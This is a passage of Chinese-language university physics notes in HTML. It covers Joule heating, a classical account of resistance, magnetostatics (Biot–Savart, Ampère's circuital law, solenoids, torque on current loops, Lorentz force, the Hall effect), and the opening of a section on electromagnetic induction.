<p>其中 <span class="arithmatex">\(P\)</span> 是电功率，<span class="arithmatex">\(W\)</span> 是电功，<span class="arithmatex">\(V\)</span> 是电压，<span class="arithmatex">\(I\)</span> 是电流</p>
</div>
<div class="admonition idea">
<p class="admonition-title">焦耳定律</p>
<p>对于 <strong>纯电阻电路</strong> ，电功率可以表示为<span class="arithmatex">\(P = I^2 R = \dfrac{V^2}{R}\)</span></p>
</div>
<h3 id="note-physics-eletronic-_24">欧姆定律的微观解释<a class="headerlink" href="#note-physics-eletronic-_24" title="Permanent link">&para;</a></h3>
<div align=center><img src="../NOTE/Physics/img/part1/24.png" width=50%/></div>

<p>原本在导体中做热运动的电子，在施加了外部电场后，会产生漂移速度；</p>
<div class="arithmatex">\[\begin{align*}
  \boldsymbol{a} &amp;= \frac{e \boldsymbol{E}}{m} \\
  \overline{v} &amp;= \frac{1}{2} \boldsymbol{a} t = \frac{e \boldsymbol{E} t}{2m} \\
  &amp;= \frac{e \boldsymbol{E} l}{2m v_d} \\
  \boldsymbol{J} &amp;= ne \overline{v} = \dfrac{n e^2 \boldsymbol{E} l}{2m v_d} = \sigma \boldsymbol{E}\\
  \sigma &amp;= \dfrac{n e^2 l}{2m v_d} \propto \frac{1}{\sqrt{T}} 
\end{align*}\]</div>
<p>其中 <span class="arithmatex">\(\lambda\)</span> 是电子的平均自由程，<span class="arithmatex">\(v_d\)</span> 是电子的热运动速度，与<span class="arithmatex">\(\sqrt{T}\)</span>成正比</p>
<p>这种算法给出了我们经典物理学中关于电阻的解释，与<span class="arithmatex">\(T\)</span>是开方函数的关系，但是这只在定性方面的正确的，确实随着温度的升高，电阻会增大；但是更加现实具体的推导需要量子力学的帮助，才能给出很好的解释</p>
<div align=center><img src="../NOTE/Physics/img/part1/25.png" width=50%/></div></section><section class="print-page" id="note-physics-magnetism" heading-number="2.3.4.3"><h1 id="note-physics-magnetism-_1">磁学部分<a class="headerlink" href="#note-physics-magnetism-_1" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 2862 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 18 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 10 分钟</p>
</div>
<div class="admonition abstract">
<p class="admonition-title">Table of contents</p>
</div>
<h2 id="note-physics-magnetism-amperes-law">Ampere's Law<a class="headerlink" href="#note-physics-magnetism-amperes-law" title="Permanent link">&para;</a></h2>
<p>对于电学，我们有库仑定律</p>
<div class="arithmatex">\[
    d \boldsymbol{F} = \frac{1}{4 \pi \epsilon_0} \frac{dq_1 dq_2}{r^2}
\]</div>
<div class="admonition definition">
<p class="admonition-title">Ampere's Law</p>
<div class="arithmatex">\[
dF_{12} = \frac{\mu_0}{4 \pi} \frac{i_2 ds_2 \times (i_1ds_1 \times \hat{r_{12}})}{r_{12}^2}
\]</div>
<p>其中，<span class="arithmatex">\(\mu_0\)</span> 是真空磁导率，<span class="arithmatex">\(i_1, i_2\)</span> 是电流，<span class="arithmatex">\(ds_1, ds_2\)</span> 是电流元长度，<span class="arithmatex">\(r_{12}\)</span> 是电流元之间的距离。</p>
</div>
<div class="admonition idea">
<p class="admonition-title">Newton's Third Law</p>
<p>Case 1: 两电流元平行
<div align="center">
    <img src="../NOTE/Physics/img/part3/1.png" width="30%"/>
</div></p>
<div class="arithmatex">\[
    F_{12} = \frac{\mu_0}{4 \pi} \frac{i_2 ds_2 \times (i_1ds_1 \times \hat{r_{12}})}{r_{12}^2}
\]</div>
<div class="arithmatex">\[
    F_{21} = \frac{\mu_0}{4 \pi} \frac{i_1 ds_1 \times (i_2ds_2 \times \hat{r_{21}})}{r_{21}^2}
\]</div>
<div class="arithmatex">\[
    F_{12} = -F_{21}
\]</div>
<p>Case 2: 两电流元垂直</p>
<div class="arithmatex">\[
    F_{12} = 0
\]</div>
<div class="arithmatex">\[
    F_{21} = \frac{\mu_0}{4 \pi} \frac{i_1 ds_1 \times (i_2ds_2 \times r_{21})}{r_{21}^2} \neq 0
\]</div>
<details class="info">
<summary>Why?</summary>
<p>这只是一小段的电流元，当考虑一整段电流时，得到的结果并不违背牛顿第三定律，当年安培就是利用相互垂直时的这一特性，巧妙的设计了实验来证明了安培定律。</p>
</details>
</div>
<h2 id="note-physics-magnetism-biot-savart-law">Biot-Savart Law<a class="headerlink" href="#note-physics-magnetism-biot-savart-law" title="Permanent link">&para;</a></h2>
<div align="center">
    <img src="../NOTE/Physics/img/part3/2.png" width="30%"/>
</div>

<p>继续根据电场中的思想，引入试探电流源并定义 <strong>磁感应强度</strong></p>
<p>如果固定一个电流元，积分另一电流元，我们有</p>
<div class="arithmatex">\[ 
    d\boldsymbol{F}_2 = i_2 d\boldsymbol{s}_2 \times \frac{\mu_0}{4\pi} \int_{L_1} \frac{i_1 d\boldsymbol{s}_1 \times \hat{r}_{12}}{r_{12}^2} 
\]</div>
<p>定义：</p>
<div class="arithmatex">\[ 
    \boldsymbol{B}_1 = \frac{\mu_0}{4\pi} \int_{L_1} \frac{i_1 d\boldsymbol{s}_1 \times \hat{r}_{12}}{r_{12}^2} 
\]</div>
<p>因此：</p>
<div class="arithmatex">\[ 
    d\boldsymbol{F}_2 = i_2 d\boldsymbol{s}_2 \times \boldsymbol{B}_1 
\]</div>
<div class="admonition definition">
<p class="admonition-title">磁感应强度</p>
<div class="arithmatex">\[
    \boldsymbol{B} = \frac{\mu_0}{4\pi} \int_{L} \frac{i d\boldsymbol{s} \times \hat{r}}{r^2}
\]</div>
<p>单位为 <span class="arithmatex">\(T\)</span>，特斯拉。</p>
<details class="info">
<summary>为什么不是磁场强度？</summary>
<p>如果要完全跟电场对应，应该使用磁场强度，但是却叫磁感应强度，这是因为大家都这么叫<img alt="👆" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/1f446.svg" title=":point_up_2:" /></p>
</details>
</div>
<h3 id="note-physics-magnetism-_2">长直导线周围的磁场场<a class="headerlink" href="#note-physics-magnetism-_2" title="Permanent link">&para;</a></h3>
<div align="center">
    <img src="../NOTE/Physics/img/part3/3.png" width="30%"/>
</div>

<div class="arithmatex">\[\begin{align*}
    d\boldsymbol{B} &amp;= \frac{\mu_0}{4\pi} \frac{i d\boldsymbol{s} \times \hat{r}}{r^2} \\
    d B &amp;= \frac{\mu_0}{4\pi} \frac{i ds \sin \theta}{r^2}\\
    B &amp;= \frac{\mu_0}{4\pi} \int_{A_1}^{A_2} \frac{i ds \sin \theta}{r^2}\\
    r &amp;= \frac{r_0}{\sin \theta}\\
    s &amp;= r_0 \cot (\pi - \theta) = -r_0 \cot \theta\\
    ds &amp;= r_0 \csc^2 \theta d\theta= r_0 \frac{d \theta}{\sin^2 \theta} \\
    B &amp;= \frac{\mu_0 i}{4\pi r_0} \int_{\theta_1}^{\theta_2} \sin \theta d\theta\\
      &amp;= \frac{\mu_0 i}{4\pi r_0} (\cos \theta_1 - \cos \theta_2)
\end{align*}\]</div>
<p>如果是无限长，则</p>
<div class="arithmatex">\[
    B = \frac{\mu_0 i}{2\pi r_0}
\]</div>
<p>也就是说，无限长直导线周围的磁感应强度与距离成反比。</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>回忆电场中的无限长直导线，其电场强度与距离成反比。</p>
<div class="arithmatex">\[
    E = \frac{\lambda}{2\pi \epsilon_0 r}
\]</div>
</div>
<h3 id="note-physics-magnetism-_3">圆电流轴线上的磁场<a class="headerlink" href="#note-physics-magnetism-_3" title="Permanent link">&para;</a></h3>
<div align="center">
    <img src="../NOTE/Physics/img/part3/4.png" width="30%"/>
</div>

<div align="center">
    <img src="../NOTE/Physics/img/part3/5.png" width="30%"/>
</div>

<p>其中由于对称性在与圆环平行的方向上，磁感应强度为零。</p>
<div class="arithmatex">\[
    dB = \frac{\mu_0}{4\pi} \frac{i ds \sin \theta}{r^2} = \frac{\mu_0}{4\pi} \frac{i ds}{r^2}(\theta = \frac{\pi}{2})
\]</div>
<div class="arithmatex">\[
    dB_x= dB \cos \alpha= \frac{\mu_0}{4 \pi} \frac{i ds}{r^2} \cos \alpha
\]</div>
<div class="arithmatex">\[
    r=\frac{r_0}{\sin \alpha}
\]</div>
<div class="arithmatex">\[
    B= \frac{\mu_0 i}{4\pi r_0^2} \int_{s} \sin^2 \alpha \cos \alpha ds =\frac{\mu_0 i}{4\pi r_0} \sin^2 \alpha \cos \alpha 2 \pi R
\]</div>
<div class="arithmatex">\[
    \sin \alpha = \frac{r_0}{\sqrt{r_0^2 + R^2}} \enspace \cos \alpha = \frac{R}{\sqrt{r_0^2 + R^2}}
\]</div>
<div class="arithmatex">\[
    B = \frac{\mu_0}{2} \frac{iR^2}{(r_0^2 + R^2)^{3/2}}
\]</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>当 <span class="arithmatex">\(r_0 \to 0\)</span> 时，<span class="arithmatex">\(B \to \frac{\mu_0 i}{2R}\)</span></p>
<p>当 <span class="arithmatex">\(r_0 \to \infty\)</span> 时，<span class="arithmatex">\(B \to \frac{\mu_0 i}{2r_0^3}R^2\)</span> 与 <span class="arithmatex">\(r_0^3\)</span> 成反比。在磁场中，电偶极矩在无穷远处产生的电场也与 <span class="arithmatex">\(r^3\)</span> 成反比。</p>
</div>
<p>定义磁偶极矩</p>
<div class="arithmatex">\[
    \boldsymbol{m} = i \pi R^2
\]</div>
<p>则</p>
<div class="arithmatex">\[
    B =  \frac{\mu_0 i}{2r_0^3}R^2 = \frac{\mu_0 m}{2 \pi r_0^3}
\]</div>
<p>如果有N匝线圈，则</p>
<div class="arithmatex">\[
    B =  \frac{\mu_0 N i}{2r_0^3}R^2 = \frac{\mu_0 N m}{2 \pi r_0^3}
\]</div>
<p>或者令 <span class="arithmatex">\(m' = N i \pi R^2\)</span>,</p>
<div class="arithmatex">\[
    B = \frac{\mu_0 m'}{2 \pi r_0^3}
\]</div>
<h3 id="note-physics-magnetism-_4">电流平面产生的磁场<a class="headerlink" href="#note-physics-magnetism-_4" title="Permanent link">&para;</a></h3>
<div align="center">
    <img src ="../img/part3/6.png" width="30%"/>
</div>

<p>由于对称性，在只会在<span class="arithmatex">\(x\)</span>方向上产生磁场</p>
<div class="arithmatex">\[ 
dB = \frac{\mu_0 di}{2\pi d} = \frac{\mu_0 \frac{i}{a} dx}{2\pi d} 
\]</div>
<div class="arithmatex">\[ 
dB_x = dB \cdot \cos \theta 
\]</div>
<div class="arithmatex">\[ 
d = \frac{R}{\cos \theta} 
\]</div>
<div class="arithmatex">\[ 
B_x = \int dB_x = \int \frac{\mu_0 i \cos^2 \theta dx}{2\pi Ra} = \frac{\mu_0 i}{2\pi aR} \int \cos^2 \theta dx 
\]</div>
<div class="arithmatex">\[ 
x = R \tan \theta, \quad dx = \frac{R \, d\theta}{\cos^2 \theta} 
\]</div>
<div class="arithmatex">\[ 
B_x = \frac{\mu_0 i}{2\pi aR} \int \cos^2 \theta dx = \frac{\mu_0 i}{2\pi a} \int_{-\alpha}^{\alpha} d\theta = \frac{\mu_0 i}{\pi a} \alpha = \frac{\mu_0 i}{\pi a} \tan^{-1} \frac{a}{2R} 
\]</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>当 $a \to 0,\alpha \to \tan\alpha =  \dfrac{a}{2R} $ 时，<span class="arithmatex">\(B_x \to \dfrac{\mu_0 i}{2\pi R}\)</span></p>
<p>当 <span class="arithmatex">\(a \to \infty, \alpha \to \dfrac{\pi}{2}\)</span> 时, <span class="arithmatex">\(B_x \to \dfrac{\mu_0 i}{2 a}=\dfrac{1}{2}\mu_0 n i_0\)</span>,n为单位长度电流数目i_0为单位电流</p>
</div>
<h3 id="note-physics-magnetism-_5">单层通电螺旋管产生的磁场<a class="headerlink" href="#note-physics-magnetism-_5" title="Permanent link">&para;</a></h3>
<p>在通电螺旋管内部，会产生匀强磁场</p>
<div align="center">
    <img src="../NOTE/Physics/img/part3/7.png" width="30%"/>
</div>

<p>设<span class="arithmatex">\(x\)</span>为点P据中心轴线的水平距离；螺线管长度为<span class="arithmatex">\(L\)</span>,单位长度匝数为<span class="arithmatex">\(n\)</span>，每匝电流为<span class="arithmatex">\(i\)</span>。</p>
<p>根据磁偶极矩产生的磁场公式</p>
<div class="arithmatex">\[
    dB = \dfrac{\mu_0 m}{2\pi r^3}=\dfrac{\mu_0 n i dl \pi R^2}{2\pi (\sqrt{R^2+(x-l)^2})^3}
\]</div>
<div class="arithmatex">\[
   r=\dfrac{R}{\sin \beta} \quad \dfrac{x-l}{R} =\cot \beta \quad dl = \dfrac{R d\beta}{\sin^2 \beta}
\]</div>
<div class="arithmatex">\[
    B =\frac{\mu_0}{2} n i \int_{\beta_1}^{\beta_2} \sin \beta d\beta = \frac{\mu_0}{2} n i (\cos \beta_1 - \cos \beta_2)  
\]</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p><span class="arithmatex">\(L \to \infty\)</span> 时，<span class="arithmatex">\(B = \mu_0 n i\)</span></p>
</div>
<h3 id="note-physics-magnetism-_6">多层通电螺线管产生的磁场<a class="headerlink" href="#note-physics-magnetism-_6" title="Permanent link">&para;</a></h3>
<div align="center">
    <img src="../NOTE/Physics/img/part3/8.png" width="30%"/>
</div>

<p>从下往上，逐层积分</p>
<div class="arithmatex">\[
    dB=\frac{\mu_0}{2} n i (\cos \beta_1 - \cos \beta_2)  
\]</div>
<p><span class="arithmatex">\(ni\)</span> 为每一层单位长度的电流，</p>
<div class="arithmatex">\[
    ni = \frac{N'i}{L} =\frac{jLdr}{L}=jdr=\frac{Ni}{L(R_2-R_1)}dr
\]</div>
<p>其中<span class="arithmatex">\(N'\)</span>为每一层的匝数，<span class="arithmatex">\(j\)</span>电流密度，<span class="arithmatex">\(R_1,R_2\)</span>为内外半径，<span class="arithmatex">\(N\)</span>为总匝数。</p>
<div class="arithmatex">\[
    \cos \beta_1 - \cos \beta_2 =2\cos \beta_1 =\dfrac{2l}{\sqrt{l^2+r^2}}
\]</div>
<div class="arithmatex">\[
    dB=\frac{\mu_0}{2} jdr \frac{2l}{\sqrt{l^2+r^2}} \quad B =\mu_0 j l \int_{R_1}^{R_2} \frac{dr}{\sqrt{r^2+l^2}}
\]</div>
<div class="arithmatex">\[
    B = \mu_0 j l \ln \dfrac{R_2+\sqrt{R_2^2+l^2}}{R_1+\sqrt{R_1^2+l^2}}
\]</div>
<details class="note">
<summary>详细过程</summary>
<p>毁了啊，secx的原函数都记不住<img alt="😢" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/1f622.svg" title=":cry:" /></p>
<p><div align="center">
    <img src="../NOTE/Physics/img/part3/9.png" width="70%"/>
</div></p>
</details>
<h2 id="note-physics-magnetism-gauss">磁场的Gauss定律和回路定律<a class="headerlink" href="#note-physics-magnetism-gauss" title="Permanent link">&para;</a></h2>
<div class="admonition section">
<p class="admonition-title">磁场中的Guass定律</p>
<div class="arithmatex">\[
    \oiint \boldsymbol{B} \cdot d \boldsymbol{A} = 0
\]</div>
<div class="admonition proof">
<p class="admonition-title">Proof</p>
<p><div align="center">
    <img src="../NOTE/Physics/img/part3/10.png" width="30%"/>
</div></p>
<p>考虑在轴线处的<span class="arithmatex">\(ids\)</span>产生的磁场，对于红色的闭合曲面，可以考虑一个穿过去的小圆环；</p>
<div class="arithmatex">\[
dA_1^* = |dA_1 \cos \theta_1| = dA_1 |\cos \theta_1|, \quad \theta_1 &gt; \frac{\pi}{2}, \quad \cos \theta_1 &lt; 0
\]</div>
<div class="arithmatex">\[
dA_2^* = |dA_2 \cos \theta_2| = dA_2 |\cos \theta_2|, \quad \theta_2 &lt; \frac{\pi}{2}, \quad \cos \theta_2 &gt; 0
\]</div>
<div class="arithmatex">\[
\therefore d\Phi_{B_1} = -d\Phi_{B_2}
\]</div>
<div class="arithmatex">\[
d\Phi_{B_1} + d\Phi_{B_2} = 0
\]</div>
<div class="arithmatex">\[
\oiint \vec{B} \cdot d\vec{A} = 0
\]</div>
</div>
</div>
<div class="admonition section">
<p class="admonition-title">磁场中的回路定律</p>
<div class="arithmatex">\[
    \oint \boldsymbol{B} \cdot d\boldsymbol{l} =\mu_0 \sum_{in \ loop} i
\]</div>
<p>以右手定则判断正负，即按照积分方向使用右手定则，大拇指指向的方向就是电流的正方向,不需要对穿过去的电流进行投影，有多少穿过就直接算多少</p>
</div>
<p>有了回路定律，求磁场就方便得多了</p>
<h4 id="note-physics-magnetism-_7">带电无穷长圆柱周围的磁场<a class="headerlink" href="#note-physics-magnetism-_7" title="Permanent link">&para;</a></h4>
<div align="center">
    <img src="../NOTE/Physics/img/part3/11.png" width="30%"/>
</div>

<p>因为磁场方向与积分方向平行；半径如果是大于圆柱的半径，则</p>
<div class="arithmatex">\[
    B=\dfrac{\mu_0 i }{2 \pi r}
\]</div>
<p>如果积分区域在里面，则</p>
<div class="arithmatex">\[
    \oint \boldsymbol{B} \cdot d\boldsymbol{l} = \mu_0 I \dfrac{r^2}{R^2} \enspace  B 2 \pi r = \mu_0 i \dfrac{r^2}{R^2}
\]</div>
<div class="arithmatex">\[
    B=\dfrac{\mu_0 i }{2 \pi R} \cdot \dfrac{r}{R}
\]</div>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<p>这说明磁场在R处达到最大</p>
<p><div align="center">
    <img src="../NOTE/Physics/img/part3/12.png" width="30%"/>
</div></p>
</div>
<h4 id="note-physics-magnetism-_8">无穷大的板<a class="headerlink" href="#note-physics-magnetism-_8" title="Permanent link">&para;</a></h4>
<div align="center">
    <img src="../NOTE/Physics/img/part3/13.png" width="30%"/>
</div>

<p>因为水平方向上由于对称性，磁场为零；</p>
<p>在电路分布的两侧，磁场方向相反，大小相等；</p>
<p>设正方形的边长为<span class="arithmatex">\(w\)</span>，则</p>
<div class="arithmatex">\[
\oint \boldsymbol{B} \cdot d\boldsymbol{l} = Bw + 0 + Bw + 0 = 2Bw = \mu_0 nwi
\]</div>
<div class="arithmatex">\[
    B=\frac{1}{2} \mu_0 n i
\]</div>
<div class="admonition idea">
<p class="admonition-title">通电无穷长螺线管?为什么不是两块板</p>
<p><div align="center">
    <img src="../NOTE/Physics/img/part3/14.png" width="30%"/>
</div></p>
<p>如果把螺线管中间切一刀，情况就与两块板很相似了，对于两侧，由于方向不同可以消去；
在中间，由于对称性，磁场为一块板的两倍，所以磁场为</p>
<div class="arithmatex">\[
    B=\mu_0 n i
\]</div>
<p>这正是我们之前推导的结果</p>
</div>
<h4 id="note-physics-magnetism-_9">螺绕环<a class="headerlink" href="#note-physics-magnetism-_9" title="Permanent link">&para;</a></h4>
<div align="center">
    <img src="../NOTE/Physics/img/part3/15.png" width="30%"/>
</div>

<div class="arithmatex">\[
   \oint \boldsymbol{B} \cdot d\boldsymbol{l} = B \cdot 2\pi r = \mu_0 Ni
\]</div>
<div class="arithmatex">\[
    B=\frac{1}{2} \mu_0 n i \enspace n = \frac{N}{2\pi r}
\]</div>
<h2 id="note-physics-magnetism-_10">电流在磁场中受到的力与力矩<a class="headerlink" href="#note-physics-magnetism-_10" title="Permanent link">&para;</a></h2>
<div class="arithmatex">\[
    d\boldsymbol{F} = i d\boldsymbol{l} \times \boldsymbol{B}
\]</div>
<p>用右手定则来判断方向</p>
<div class="admonition warning">
<p class="admonition-title">Warning</p>
<p>左手定则，out！全部使用右手定则，如果是电子运动，也可以当作微小电流来处理，安培力和洛伦兹力本质上是一样的</p>
</div>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p><div align="center">
    <img src="../NOTE/Physics/img/part3/16.png" width="60%"/>
</div></p>
<p>平的部分很简单，弯弯的部分使用微分，发现水平部分的力由于对称性为零，只有竖直部分的力</p>
<div class="arithmatex">\[
    F_2 = F_\perp = \int_0^{\pi} iBR d\theta \sin \theta = iBR \int_0^{\pi} \sin \theta d\theta = 2iBR
\]</div>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
</div>
<details class="info">
<summary>Info</summary>
<p>安培的定义；两个相距<span class="arithmatex">\(1m\)</span>的直导线，通过的电流，产生的力为<span class="arithmatex">\(2 \times 10^{-7} N\)</span>；这样大小的电流称为<span class="arithmatex">\(1A\)</span></p>
</details>
<h3 id="note-physics-magnetism-_11">矩形线圈<a class="headerlink" href="#note-physics-magnetism-_11" title="Permanent link">&para;</a></h3>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<p>磁偶极矩的方向为右手定则的方向</p>
<div class="arithmatex">\[
    \boldsymbol{\mu} = i \pi R^2 \boldsymbol{n}
\]</div>
</div>
<p>对于一个矩形线圈，如果它能绕着一个轴旋转，如图</p>
<div align="center">
    <img src="../NOTE/Physics/img/part3/17.png" width="50%"/>
</div>

<div class="arithmatex">\[
\tau = F_{AB} \frac{b}{2} \sin \theta + F_{CD} \frac{b}{2} \sin \theta
\]</div>
<div class="arithmatex">\[
= i a B \frac{b}{2} \sin \theta + i a B \frac{b}{2} \sin \theta
\]</div>
<div class="arithmatex">\[
= i B A \sin \theta
\]</div>
<div class="arithmatex">\[
\vec{\tau} = i A (\vec{n} \times \vec{B}) = \vec{\mu} \times \vec{B}
\]</div>
<h3 id="note-physics-magnetism-_12">任意形状线圈<a class="headerlink" href="#note-physics-magnetism-_12" title="Permanent link">&para;</a></h3>
<p>现在将结论推广到任意形状的线圈，如图，磁偶极矩与磁场垂直</p>
<div align="center">
    <img src="../NOTE/Physics/img/part3/18.png" width="50%"/>
</div>

<p>将线圈分割为一个个小矩形，每个小矩形内部电流依次相消，最后合电流为原电流</p>
<div class="arithmatex">\[
dF_1 = i ds_1 B \sin \theta_1
\]</div>
<div class="arithmatex">\[
dF_2 = i ds_2 B \sin \theta_2
\]</div>
<div class="arithmatex">\[
ds_1 \sin \theta_1 = ds_2 \sin \theta_2 = dh
\]</div>
<div class="arithmatex">\[
dF_1 = dF_2 = i B dh
\]</div>
<div class="arithmatex">\[
d\tau = dF_1 \cdot x_1 + dF_2 \cdot x_2
\]</div>
<div class="arithmatex">\[
= iB dh (x_1 + x_2)
\]</div>
<div class="arithmatex">\[
= iB dA
\]</div>
<div class="arithmatex">\[
\tau = \int d\tau = \int iB dA = iBA 
\]</div>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<p>这种力矩使得磁偶极矩有转到磁场方向的趋势</p>
</div>
<h2 id="note-physics-magnetism-_13">点电荷在磁场中运动<a class="headerlink" href="#note-physics-magnetism-_13" title="Permanent link">&para;</a></h2>
<div class="admonition property">
<p class="admonition-title">Property</p>
<ul>
<li>洛伦兹力不做功</li>
<li>洛伦兹力只改变速度方向，不改变速度大小</li>
<li>洛伦兹力方向用右手定则判断</li>
<li>对于速度为<span class="arithmatex">\(v\)</span>的点电荷，洛伦兹力为<span class="arithmatex">\(q \boldsymbol{v_{\perp}}\boldsymbol{B}\)</span></li>
<li>如果在匀强磁场中，做圆周运动，则<span class="arithmatex">\(q \boldsymbol{v_{\perp}}\boldsymbol{B} = \dfrac{mv^2}{r} \rightarrow r = \dfrac{mv}{qB}\)</span></li>
<li>速度选择器:<span class="arithmatex">\(\boldsymbol{E} \perp \boldsymbol{B}\)</span>，则<span class="arithmatex">\(qE = qvB \rightarrow v = \dfrac{E}{B}\)</span>,速度选择器接着一个磁场，根据半径不同，可以做到分离同位素</li>
<li>回旋加速器: 电场加速，磁场偏转，交流电的周期与粒子做圆周运动的周期相同；<span class="arithmatex">\(v=\dfrac{qBr}{m}\)</span>，<span class="arithmatex">\(T=\dfrac{2\pi m}{qB}\)</span>,<span class="arithmatex">\(E_k = \dfrac{1}{2}mv^2 = \dfrac{q^2 B^2 r^2}{2m}\)</span></li>
</ul>
<details class="warning">
<summary>Warning</summary>
<p>当回旋加速器中的粒子速度接近光速时，粒子质量会发生变化，导致粒子做圆周运动的周期发生变化，从而导致固定的交流电频率无法一直加速；粒子无法被加速到更高的能量。可以通过修改磁场大小：</p>
<div class="arithmatex">\[
    m=\frac{m_0}{\sqrt{1-\frac{v^2}{c^2}}}
\]</div>
<div class="arithmatex">\[
    T=\frac{2\pi m}{qB}=\frac{2\pi m_0}{qB\sqrt{1-\frac{v^2}{c^2}}}
\]</div>
<p>修改B；  </p>
<div class="arithmatex">\[
    B \sqrt{1-\frac{v^2}{c^2}} = const
\]</div>
</details>
<ul>
<li>同步加速器</li>
<li>霍尔效应：带电粒子在磁场中运动，在垂直于磁场方向的导体中，由于洛伦兹力，电荷会向一侧偏转，从而在导体两侧形成电势差，平衡时，洛伦兹力等于电场力，<span class="arithmatex">\(qE = qvB \rightarrow E = vB\)</span>，<span class="arithmatex">\(U = E \cdot d = vBd\)</span>，<span class="arithmatex">\(I = j \cdot d \cdot w = nqv \cdot d \cdot w\)</span>，<span class="arithmatex">\(j = nqv\)</span>，<span class="arithmatex">\(U = \dfrac{I B d}{nqwd}\)</span>，<span class="arithmatex">\(R_H = \dfrac{U}{I} = \dfrac{B}{nqw}\)</span>，<span class="arithmatex">\(R_H\)</span>称为霍尔系数，<span class="arithmatex">\(n\)</span>为载流子浓度，<span class="arithmatex">\(q\)</span>为载流子电量，<span class="arithmatex">\(w\)</span>为导体宽度，<span class="arithmatex">\(d\)</span>为导体厚度</li>
</ul>
</div></section><section class="print-page" id="note-physics-electrodynamincs" heading-number="2.3.4.4"><h1 id="note-physics-electrodynamincs-_1">电动力学<a class="headerlink" href="#note-physics-electrodynamincs-_1" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 3331 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 33 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 11 分钟</p>
</div>
<h2 id="note-physics-electrodynamincs-_2">法拉第电磁感应定律<a class="headerlink" href="#note-physics-electrodynamincs-_2" title="Permanent link">&para;</a></h2>
<div class="arithmatex">\[
    \Phi = \int_S \boldsymbol{B} \cdot d\boldsymbol{S}
\]</div>
<div class="arithmatex">\[
    \varepsilon = -\frac{d\Phi}{dt}
\]</div>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<p>楞次定律已经蕴含在"-"号中,楞次定律是能量守恒定律在电磁感应中的体现</p>
</div>
<h2 id="note-physics-electrodynamincs-_3">动生电动势<a class="headerlink" href="#note-physics-electrodynamincs-_3" title="Permanent link">&para;</a></h2>
<p>电荷受到的非静电力</p>
<div class="arithmatex">\[
    \boldsymbol{f} = q(\boldsymbol{v} \times \boldsymbol{B})
\]</div>
<p>实际上这个是洛伦兹力的分量</p>
<div class="admonition proof">
<p class="admonition-title">Proof</p>
<p><div align=center>
    <img src="../NOTE/Physics/img/part2/1.png" width="50%">
</div>
克服洛伦兹力的分量做功转化为非静电力做功,洛伦兹力总的不做功</p>
<div class="arithmatex">\[
    V=v+v_d \enspace F=N+f
\]</div>
<div class="arithmatex">\[
    F=qVB
\]</div>
<div class="arithmatex">\[
    dW_N=N (vdt)=F\sin\theta vdt=Fvdt\dfrac{v_d}{V}=F\dfrac{v}{V}(v_d dt)=F\cos\theta v_d dt=fv_d dt=dW_f
\]</div>
</div>
<div class="admonition key-point">
<p class="admonition-title">动生电动势</p>
<div class="arithmatex">\[
